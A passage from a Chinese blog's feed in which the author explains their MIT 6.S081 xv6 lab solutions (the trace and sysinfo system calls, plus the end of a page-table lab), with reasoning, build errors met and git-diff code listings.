line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3bd0007..359847c 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -81,6 +81,36 @@ int<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">sys_pgaccess(void)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  // lab pgtbl: your code here.</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">  void *base, *mask;</span><span class="token prefix inserted">+</span><span class="token line">  long kmask; // buffer</span><span class="token prefix inserted">+</span><span class="token line">  int len;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(0, (uint64 *)&amp;base) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argint(1, &amp;len) &lt; 0 || len > 64) &#123; // page limited to 64</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (argaddr(2, (uint64 *)&amp;mask) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  kmask = 0L; // initialize bitmask to zero</span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; len; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 va = (uint64)(base + i * PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">pte = walk(p->pagetable, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">if (*pte &amp; PTE_A) &#123; // pte was accessed recently</span><span class="token prefix inserted">+</span><span class="token line">  kmask |= (1 &lt;&lt; i);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">*pte &amp;= ~PTE_A; // clear access bit</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  if (copyout(p->pagetable, (uint64)mask, (char *)&amp;kmask, 8) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">#endif</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Speed-up-system-calls&quot;&gt;&lt;a href=&quot;#Speed-up-system-calls&quot; class=&quot;headerlink&quot; title=&quot;Speed up system calls&quot;&gt;&lt;/a&gt;Speed up system calls&lt;/</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab System calls</title>
    <link href="http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/"/>
    <id>http://lordaeronesz.github.io/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/</id>
    <published>2024-06-27T03:45:11.000Z</published>
    <updated>2024-06-27T03:39:54.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xv6系统调用实现"><a href="#xv6系统调用实现" class="headerlink" title="xv6系统调用实现"></a>xv6系统调用实现</h1><p>不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是要在内核层面实现一些系统调用。这其中难免涉及到一些对内核数据结构的操作，以及处理器体系结构（本系列 Lab 基于 RISCV）相关的内容，那么首先有必要梳理一下 xv6 下系统调用的实现过程。</p><p>xv6 系统调用的实现：</p><ol><li>以 <code>trace</code> 系统调用为例，用户通过调用 <code>user/user.h</code> 中的函数 <code>trace</code> 进行系统调用。</li><li>通过调用 Perl 脚本 <code>user/usys.pl</code> 生成的一系列汇编代码，该汇编代码的作用是设置寄存器的内容并实现用户态到内核态的切换，内核后续针对寄存器中的内容执行相应的系统调用操作。以下是对 <code>user/usys.pl</code> 代码的逐行解析：</li></ol><blockquote><ol><li><p><code>#!/usr/bin/perl -w</code>：这是一个Perl脚本的“shebang”行，指定使用<code>/usr/bin/perl</code>解释器执行此脚本，并开启警告（<code>-w</code>）选项。</p></li><li><p><code>print &quot;# generated by usys.pl - do not edit\n&quot;;</code>：打印注释说明此文件是由<code>usys.pl</code>脚本自动生成的，不应手动编辑。</p></li><li><p><code>print &quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;;</code>：输出一条预处理器指令，包含一个名为<code>syscall.h</code>的头文件，该文件可能包含了系统调用相关的常量和宏定义。</p></li><li><p><code>sub entry &#123;...&#125;</code>：定义了一个名为<code>entry</code>的子程序（函数），它接受一个参数（系统调用名称）。</p></li><li><p><code>my $name = shift;</code>：在<code>entry</code>函数内部，使用<code>shift</code>函数获取传入的第一个参数（系统调用名称），并将其存储在变量<code>$name</code>中。</p></li><li><p>接下来的几行<code>print</code>语句构造了每个系统调用存根的汇编代码：</p><ul><li><code>.global $name</code>：声明一个全局标签（函数名），使得链接器能够找到它。</li><li><code>$&#123;name&#125;:\n</code>：定义了一个标签，对应于系统调用函数的开始。</li><li><code>li a7, SYS_$&#123;name&#125;\n</code>：装载（load immediate）指令，将系统调用号（通过宏<code>SYS_$&#123;name&#125;</code>得到）放入寄存器a7中。在RISC-V架构中，a7寄存器通常用于存放系统调用号。</li><li><code>ecall</code>：执行系统调用指令，这会触发处理器进入内核模式并执行相应的内核服务。</li><li><code>ret</code>：返回指令，从系统调用中返回到用户程序。</li></ul></li><li><p>最后，脚本通过多次调用<code>entry</code>函数（传入不同的系统调用名称，如<code>fork</code>, <code>exit</code>, <code>wait</code>等），为每一个列出的系统调用生成对应的汇编代码存根。</p></li></ol></blockquote><ol start="3"><li>内核在执行系统调用时，只是调用 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，该函数读取寄存器 a7 的值，将其作为系统调用号，执行实际的系统调用函数（如<code>sys_trace</code>），并将函数返回值放入寄存器 a0 中，调用结束。</li></ol><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>理解了上述的系统调用过程，就可以开始着手完成系统调用的添加了。</p><p>由题干可知，用户态系统调用函数 <code>trace</code> 的参数为一个整型 mask，该 mask 用来表示哪些系统调用需要被追踪，如果 mask 的第 i 位为 1，则系统调用号 i 对应的系统调用将被追踪。</p><p>首先，在 <code>user/user.h</code>、<code>user/usys.pl</code> 和 <code>kernel/syscall.h</code> 中添加 <code>trace</code> 的声明。</p><p>接下来，在 <code>kernel/sysproc.c</code> 中实现系统调用函数 <code>sys_trace</code>，该函数获取用户态传递的 <code>trace</code> 函数的参数 mask，并存入当前进程的 PCB（进程控制块，xv6 中为 <code>kernel/proc.h</code> 中的 <code>struct proc</code> 结构体）中。获取参数的操作，可以查看如下 xv6 文档的描述，并参考 <code>kernel/sysproc.c</code> 中其它系统调用函数的实现。由于参数类型为整型且数量只有一个（存放在 a0 寄存器中），因此调用 <code>argint(0, &amp;(myproc()-&gt;mask))</code>。另外需要注意的是，<code>struct proc</code> 的初始定义中并没有 mask 段的内容，需要自行添加。</p><blockquote><p>Because user code calls system call wrapper functions, the arguments are initially where the RISC-V C calling convention places them: in registers. The kernel trap code saves user registers to the current process’s trap frame, where kernel code can find them. The kernel functions argint, argaddr, and argfd retrieve the n ’th system call argument from the trap frame as an integer, pointer, or a file descriptor. They all call argraw to retrieve the appropriate saved user register (kernel/syscall.c:35).</p></blockquote><p>然后，修改 <code>kernel/proc.c</code> 中 <code>fork</code> 函数的定义，为 mask 字段添加拷贝操作，将父进程的 mask 字段传递给子进程，以此实现对子进程的追踪。</p><pre class="language-c" data-language="c"><code class="language-c">np<span class="token operator">-></span>mask <span class="token operator">=</span> p<span class="token operator">-></span>mask<span class="token punctuation">;</span></code></pre><p>最后，修改 <code>kernel/syscall.c</code> 中的 <code>syscall</code> 函数，判断当前的系统调用号是否位于被追踪的范围内，如果是，则按照要求格式将要追踪的信息打印出来：其中进程号为 <code>myproc()-&gt;pid</code>；函数调用名可手动创建一个系统调用名称表，通过将系统调用号作为下标来获取；函数返回值位于寄存器 a0 中，可通过 <code>myproc()-&gt;trapframe-&gt;a0</code> 来获取。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最后再记录一下本 Lab 遇到的一些问题：</p><h3 id="make失败"><a href="#make失败" class="headerlink" title="make失败"></a>make失败</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/mkerr.png"></p><p>被这个错误困扰了挺久，甚至还为此使用 <code>git reset</code> 回退了版本，最后发现是在 <code>$U/_trace\</code> 的末尾多了一个空格。。。</p><h3 id="系统调用名称表添加出错"><a href="#系统调用名称表添加出错" class="headerlink" title="系统调用名称表添加出错"></a>系统调用名称表添加出错</h3><p><img src="/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/aserr.png"></p><p>原因是我将系统调用名称表添加在了 <code>kernel/syscall.h</code> 中，但该头文件后续是会被 <code>user/usys.pl</code> 用于生成汇编的，因此不能包含 C 语言语句，最后是选择直接添加在了 <code>kernel/syscall.c</code> 中。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>由于本 Lab 主要是在原先的内核代码上进行修改，涉及的文件较多，因此代码部分以 <code>git diff</code> 的形式展现。</p><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex c926b7e..6647da5 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -193,6 +193,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_trace\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..f4bd5c2 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -314,6 +314,9 @@ fork(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  acquire(&amp;np->lock);</span><span class="token prefix unchanged"> </span><span class="token line">  np->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;np->lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  np->mask = p->mask;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pid;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..e83d456 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  int mask;   // Mask of trace</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..b5b8291 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_trace(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,16 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_trace]   sys_trace,</span><span class="token prefix inserted">+</span><span class="token line">&#125;;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static char *syscall_names[] = &#123;</span><span class="token prefix inserted">+</span><span class="token line">"dummy",  "fork",  "exit",  "wait",  "pipe",</span><span class="token prefix inserted">+</span><span class="token line">"read",   "kill",  "exec",  "fstat", "chdir",</span><span class="token prefix inserted">+</span><span class="token line">"dup",    "getpid","sbrk",  "sleep", "uptime",</span><span class="token prefix inserted">+</span><span class="token line">"open",   "write", "mknod", "unlink", "link",</span><span class="token prefix inserted">+</span><span class="token line">"mkdir",  "close", "trace",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>@@ -138,6 +149,11 @@ syscall(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  num = p->trapframe->a7;</span><span class="token prefix unchanged"> </span><span class="token line">  if(num > 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    p->trapframe->a0 = syscalls[num]();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->mask &amp; (1 &lt;&lt; num)) &#123;  // if mask contains current syscall num</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: syscall %s -> %d\n", p->pid, syscall_names[num], p->trapframe->a0);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    printf("%d %s: unknown sys call %d\n",</span><span class="token prefix unchanged"> </span><span class="token line">            p->pid, p->name, num);</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..756d191 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..3ff51d9 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -95,3 +95,11 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_trace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..16107d6 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int trace(int); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..76c64ec 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file</code></pre><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>在完整添加了一个新的系统调用，熟悉了整体流程之后，本题相对就比较轻松了。声明添加的操作就跳过不谈了，这里主要关注 <code>sys_sysinfo</code> 的实现：即获取 <code>freemem</code> 和 <code>nproc</code> 的信息并将其填充到参数 <code>sysinfo</code> 指针对应的地址处。</p><p>这个大的目标可以拆分为 3 个小目标：</p><ol><li>如何获取 <code>freemem</code> 的信息？</li><li>如何获取 <code>nproc</code> 的信息？</li><li>如何将数据填充入指定的地址中（用户空间）？</li></ol><h3 id="获取-freemem-的信息"><a href="#获取-freemem-的信息" class="headerlink" title="获取 freemem 的信息"></a>获取 <code>freemem</code> 的信息</h3><p>仔细阅读 <code>kernel/kalloc.c</code> 的代码，可以发现一些关键信息：</p><ul><li><code>struct run</code>：用来内存分配单元的数据结构，本身的地址即为所指向的内存空间的起始地址，包含一个 <code>next</code> 指针，用于实现链表。</li><li><code>kmem.freelist</code>：空闲链表，存储着一系列指向空闲空间的指针。</li><li><code>PGSIZE</code>：内存分配页的大小，即每个 <code>struct run *</code> 所指向的内存空间的大小。</li></ul><p>了解了上述信息后，计算空闲空间的大小就很简单了，只需要计算空闲链表的长度 <code>n</code>，空闲内存的空间大小即为 <code>n * PGSIZE</code>。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>uint64 bytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">run</span> <span class="token operator">*</span>r<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> kmem<span class="token punctuation">.</span>freelist<span class="token punctuation">;</span> r<span class="token punctuation">;</span> r <span class="token operator">=</span> r<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>bytes <span class="token operator">+=</span> PGSIZE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> bytes<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="获取-nproc-的信息"><a href="#获取-nproc-的信息" class="headerlink" title="获取 nproc 的信息"></a>获取 <code>nproc</code> 的信息</h3><p>与上面一样，阅读 <code>kernel/proc.c</code> 的代码，可知：</p><ul><li><code>struct proc proc[NPROC]</code> ：进程数组，存储着所有进程的 <code>struct proc</code>.</li><li><code>UNUSED</code>：<code>struct proc</code> 中 <code>enum procstate</code> 的类型之一，代表本 <code>struct proc</code> 未被使用。</li></ul><p>那么要得到当前系统中进程的数量，只需要遍历整个 <code>proc</code>，计算未处于 <code>UNUSED</code> 状态的进程数量即可。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>uint64 num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> proc<span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token operator">&amp;</span>proc<span class="token punctuation">[</span>NPROC<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>num <span class="token operator">+=</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>state <span class="token operator">!=</span> UNUSED<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="将数据填充入指定的地址中"><a href="#将数据填充入指定的地址中" class="headerlink" title="将数据填充入指定的地址中"></a>将数据填充入指定的地址中</h3><p>得到 <code>freemem</code> 和 <code>nproc</code> 之后，就需要将数据写入 <code>sysinfo</code> 的参数 <code>struct sysinfo *</code> 指向的内存区域，获取参数的方法和 <code>tracing</code> 类似，不过由于参数是指针类型，因此采用 <code>argaddr</code>。最后，仿照 <code>kernel/file.c</code> 中的操作，使用 <code>copyout</code> 将内核区域的数据写入用户空间中。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_sysinfo</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">myproc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sysinfo</span> info<span class="token punctuation">;</span>uint64 addr<span class="token punctuation">;</span>info<span class="token punctuation">.</span>freemem <span class="token operator">=</span> <span class="token function">freemem_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>info<span class="token punctuation">.</span>nproc <span class="token operator">=</span> <span class="token function">proc_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// get argument addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">argaddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// copy data of info to addr</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copyout</span><span class="token punctuation">(</span>p<span class="token operator">-></span>pagetable<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>info<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 6647da5..cfb5119 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -194,6 +194,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_trace\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_sysinfotest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..b2dbb8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          freemem_bytes(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -104,6 +105,7 @@ void            yield(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             either_copyout(int user_dst, uint64 dst, void *src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">int             either_copyin(void *dst, int user_src, uint64 src, uint64 len);</span><span class="token prefix unchanged"> </span><span class="token line">void            procdump(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">uint64          proc_num(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// swtch.S</span><span class="token prefix unchanged"> </span><span class="token line">void            swtch(struct context*, struct context*);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..686d84e 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -80,3 +80,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 freemem_bytes(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">uint64 bytes = 0;</span><span class="token prefix inserted">+</span><span class="token line">struct run *r;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">for (r = kmem.freelist; r; r = r->next) &#123;</span><span class="token prefix inserted">+</span><span class="token line">bytes += PGSIZE;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return bytes;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/proc.c b/kernel/proc.cindex f4bd5c2..ed6eec4 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -657,3 +657,15 @@ procdump(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("\n");</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token 